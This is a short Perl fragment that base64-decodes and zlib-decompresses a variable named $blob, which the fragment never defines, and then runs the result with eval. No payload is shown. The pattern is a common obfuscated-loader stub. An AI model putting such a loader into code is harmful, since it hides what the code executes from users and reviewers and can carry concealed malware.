use MIME::Base64;
use Compress::Zlib;
my $packed = decode_base64($blob);
my $code = uncompress($packed);
eval $code;
